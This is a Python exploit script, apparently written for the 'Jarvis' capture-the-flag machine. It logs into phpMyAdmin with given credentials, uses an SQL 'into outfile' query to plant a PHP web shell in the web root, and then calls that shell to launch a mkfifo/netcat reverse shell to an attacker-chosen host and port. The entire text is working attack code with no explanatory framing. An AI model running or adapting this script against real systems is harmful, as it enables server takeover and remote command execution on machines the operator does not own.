#10.1.37-MariaDB-0+deb9u1 mysql phpmyadmin reverse shell script
#based on jarvis
import requests
import sys
from bs4 import BeautifulSoup

proxies = {'http':'http://127.0.0.1:8080'}

if len(sys.argv) < 5:
    print ("(+) usage %s: <target> user:pass lhost lport" % sys.argv[0])
    sys.exit(-1)
    
target = sys.argv[1]
lhost = sys.argv[3]
lport = sys.argv[4]

try:
    user = sys.argv[2].split(":")[0]
    pswd = sys.argv[2].split(":")[1]
except:
    print("(-) username and passwrods needs to be in the format user:pass")
    sys.exit(-1)
    
s=requests.session()

r=s.get("http://"+target+"/phpmyadmin")
soup=BeautifulSoup(r.content,'html.parser')
print("finding set_session and token")
set_session_src = soup.find('input',{'name':'set_session'})['value']
token_src=soup.find('input',{'name':'token'})['value']
print("set session : " + set_session_src)
print("token : " + token_src)

data={
    'set_session':set_session_src,
    'pma_username': user,
    'pma_password':pswd,
    'server':'1',
    'target':'index.php',
    'token':token_src
    }

r=s.post("http://10.10.10.143/phpmyadmin/index.php", data=data,proxies=proxies)
soup=BeautifulSoup(r.content,'html.parser')
token_src=soup.find('input',{'name':'token'})['value']
payload =" select \"<?php system($_REQUEST['cmd']); ?>\" into outfile \"/var/www/html/bcmd.php\""

data = {
    'sql_query':payload,
    'server':'1',
    'no_history':'true',
    '_nocache':'1594052995563725414',
    'token':token_src,
    }

r=s.post("http://"+target+"/phpmyadmin/lint.php",data=data,proxies=proxies)

data = {
    'is_js_confirmed':'0',
    'db':'mysql',
    'token':token_src,
    'pos':'0',
    'goto':'db_sql.php',
    'message_to_show':'Your SQL has been executed succesfully.',
    'prev_sql_query':'',
    'sql_query':payload,
    'sql_delimeter':';',
    'show_query':'1',
    'fk_checks':'1',
    'SQL':'Go',
    'ajax_request':'true',
    'ajax_page_request':'true',
    '_nocache':'1594052995563725414',
    'token':token_src
    }

r=s.post("http://"+target+"/phpmyadmin/import.php", data=data, proxies=proxies)

r=s.get("http://"+target+"/bcmd.php?cmd=id",proxies=proxies)

payload = "touch /tmp/f; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 4444 > /tmp/f"

r=s.get("http://"+target+"/bcmd.php?cmd="+payload, proxies=proxies)

payload = "touch /tmp/f; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>%261 | nc "+lhost+" "+lport+" > /tmp/f"
r=s.get("http://"+target+"/bcmd.php?cmd="+payload, proxies=proxies)


